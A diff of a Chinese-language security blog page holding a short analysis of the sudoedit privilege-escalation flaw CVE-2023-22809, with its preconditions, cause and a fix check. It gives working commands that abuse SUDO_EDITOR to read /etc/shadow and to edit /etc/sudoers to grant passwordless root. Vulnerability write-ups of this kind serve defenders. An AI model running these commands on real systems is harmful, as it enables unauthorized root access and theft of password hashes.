@@ -6,19 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: 安全工具开发 | 学无止境</title>
+  <title>CVE-2023-22809-Linux提权漏洞分析 | 学无止境</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="信息安全学习记录">
-<meta property="og:type" content="website">
-<meta property="og:title" content="学无止境">
-<meta property="og:url" content="http://example.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/index.html">
+  <meta name="description" content="序2023年爆出提权漏洞CVE-2023-22809，一开始看到很多文章对这个漏洞的介绍描述感觉挺严重的，说是适用范围广、利用难度低，CVSS评分给到了7.8。但我仔细分析发现该漏洞限制挺多的，其实并没有那么好用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2023-22809-Linux提权漏洞分析">
+<meta property="og:url" content="http://example.com/2024/01/12/linux/index.html">
 <meta property="og:site_name" content="学无止境">
-<meta property="og:description" content="信息安全学习记录">
+<meta property="og:description" content="序2023年爆出提权漏洞CVE-2023-22809，一开始看到很多文章对这个漏洞的介绍描述感觉挺严重的，说是适用范围广、利用难度低，CVSS评分给到了7.8。但我仔细分析发现该漏洞限制挺多的，其实并没有那么好用。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbed.easy233.top/newblog/202401121803709.png">
+<meta property="og:image" content="https://picbed.easy233.top/newblog/202401121805161.png">
+<meta property="og:image" content="https://picbed.easy233.top/newblog/202401121805472.png">
+<meta property="og:image" content="https://picbed.easy233.top/newblog/202401121808448.png">
+<meta property="og:image" content="https://picbed.easy233.top/newblog/202401121809792.png">
+<meta property="og:image" content="https://picbed.easy233.top/newblog/202401121809813.png">
+<meta property="article:published_time" content="2024-01-12T09:56:11.000Z">
+<meta property="article:modified_time" content="2024-01-14T02:17:32.703Z">
 <meta property="article:author" content="EASY">
+<meta property="article:tag" content="Linux提权">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picbed.easy233.top/newblog/202401121803709.png">
   
     <link rel="alternative" href="/atom.xml" title="学无止境" type="application/atom+xml">
   
@@ -194,65 +204,284 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-linux" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/04/18/python%E4%B8%ADrequests%E5%BA%93%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E6%8C%87%E5%8D%97/" class="archive-article-date">
-        <time datetime="2021-04-18T01:50:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-18</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/04/18/python%E4%B8%ADrequests%E5%BA%93%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E6%8C%87%E5%8D%97/" target="_blank">python中requests库一些注意事项</a>
   
+    <h1 class="article-title" itemprop="name">
+      CVE-2023-22809-Linux提权漏洞分析
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2024/01/12/linux/" class="archive-article-date">
+        <time datetime="2024-01-12T09:56:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-12</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">763字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">3分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>2023年爆出提权漏洞CVE-2023-22809，一开始看到很多文章对这个漏洞的介绍描述感觉挺严重的，说是适用范围广、利用难度低，CVSS评分给到了7.8。但我仔细分析发现该漏洞限制挺多的，其实并没有那么好用。</p>
+<span id="more"></span>
+
+<h1 id="1、sudo提权简介"><a href="#1、sudo提权简介" class="headerlink" title="1、sudo提权简介"></a>1、sudo提权简介</h1><p>sudo 全称 Substitute User and Do，用来临时赋予root权限运行某个程序。<br>sudo执行原理：<br>普通用户执行命令时，首先检查&#x2F;var&#x2F;run&#x2F;sudo&#x2F;目录下是否有用户时间戳，centos检查&#x2F;var&#x2F;db&#x2F;sudo&#x2F;目录，并检查是否过期。如果时间戳过期，就需要输入当前用户的密码。输入后检查&#x2F;etc&#x2F;sudoers配置文件，查看用户是否有sudo权限，如果有执行sudo命令并返回结果，然后退出sudo返回到普通用户的shell环境。</p>
+<p><img src="https://picbed.easy233.top/newblog/202401121803709.png" alt="image-20240112180342641"></p>
+<p>普通用户添加sudo权限</p>
+<p>1、添加进入sudo组</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -a -G sudo steven&lt;username&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、<strong>修改</strong> <strong>&#x2F;etc&#x2F;sudoers</strong> <strong>文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User privilege specification</span></span><br><span class="line">root    ALL=(ALL:ALL) ALL</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow members of group sudo to execute any <span class="built_in">command</span></span></span><br><span class="line">&lt;username&gt;   ALL=(ALL:ALL) ALL   //增加属于自己的用户名</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>常规用户使用sudo命令需要当前用户密码可以在<code>/etc/sudoers</code> 文件中添加</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;username&gt; ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picbed.easy233.top/newblog/202401121805161.png" alt="img"></p>
+<p>即可无需账户密码直接使用sudo执行命令了</p>
+<p><img src="https://picbed.easy233.top/newblog/202401121805472.png" alt="img"></p>
+<h1 id="2、CVE-2023-22809"><a href="#2、CVE-2023-22809" class="headerlink" title="2、CVE-2023-22809"></a>2、CVE-2023-22809</h1><p>经过研究该漏洞比较鸡肋，要利用该漏洞需要满足以下条件：</p>
+<p>1、当前用户需要可以使用 sudo 来执行 sudoedit， 需要&#x2F;etc&#x2F;sudoers 有相应的设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello ALL=(ALL:ALL) sudoedit /etc/xml</span><br></pre></td></tr></table></figure>
+
+<p>2、需要知道当前用户账户密码。</p>
+<p>3、漏洞影响访问：1.8.0 ~ 1.9.12p1</p>
+<h2 id="2-1、漏洞复现"><a href="#2-1、漏洞复现" class="headerlink" title="2.1、漏洞复现"></a>2.1、漏洞复现</h2><p>漏洞环境：</p>
+<p><img src="https://picbed.easy233.top/newblog/202401121808448.png" alt="img"></p>
+<p>1、添加普通用户hello，并添加<code>sudo</code>执行<code>sudoedit</code>权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello ALL=(ALL:ALL) sudoedit /etc/xml(/etc/xml位置可以替换为任意可执行的文件（例如：/etc/vim等)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picbed.easy233.top/newblog/202401121809792.png" alt="img"></p>
+<p>2、执行以下命令，执行需要输入<code>hello</code>用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUDO_EDITOR=&#x27;cat -- /etc/shadow&#x27; sudoedit /etc/xml</span><br></pre></td></tr></table></figure>
+
+<p>如果能够读取<code>/etc/shadow</code>成功就表明漏洞存在</p>
+<p><img src="https://picbed.easy233.top/newblog/202401121809813.png" alt="img"></p>
+<p>如果出现以下提示，说明漏洞已经修复：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit: editor arguments may not contain &quot;--&quot;</span><br></pre></td></tr></table></figure>
+
+<p>3、如果想要提权使用可以使用以下命令修改</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SUDO_EDITOR=&#x27;nano -- /etc/sudoers&#x27; sudoedit /etc/xml</span><br><span class="line">或者</span><br><span class="line">SUDO_EDITOR=&#x27;vim -- /etc/sudoers&#x27; sudoedit /etc/xml</span><br></pre></td></tr></table></figure>
+
+<p>在里面添加以下命令，即可让hello无需输入账户密码无限制的使用sudo权限了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2、漏洞原理"><a href="#2-2、漏洞原理" class="headerlink" title="2.2、漏洞原理"></a>2.2、漏洞原理</h2><p>简单来说就是sudoedit 可以根据 EDITOR、VISUAL 和 SUDO_EDITOR 环境变量来指定编辑器，如果编辑器的参数中包含 “–” ， “–” 会被替换成文件名，导致可以越权访问文件及提升本地权限。</p>
+<p>比如<code>SUDO_EDITOR=&#39;cat -- /etc/shadow&#39; sudoedit /etc/xml</code>该命令最终解析的结果其实为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -- /etc/shadow -- /etc/xml</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3、参考文章"><a href="#2-3、参考文章" class="headerlink" title="2.3、参考文章"></a>2.3、参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.shellcodes.org/Hacking/CVE-2023-22809%EF%BC%88sudoedit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%89%E5%88%86%E6%9E%90.html">CVE-2023-22809（sudoedit 权限提升漏洞）分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://anxinsec.com/zh-cn/about-us/news/0390.html">https://anxinsec.com/zh-cn/about-us/news/0390.html</a></p>
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/alipay.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/weixin.png">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          EASY
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://example.com/2024/01/12/linux/" title="CVE-2023-22809-Linux提权漏洞分析" target="_blank">http://example.com/2024/01/12/linux/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">安全工具开发</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Linux提权</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+    
 
     
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2024/01/12/linux/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2023/10/30/%E4%BA%91%E5%AD%98%E5%82%A8%E6%A1%B6%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">云存储桶安全配置问题</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
           </div>
@@ -293,9 +522,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
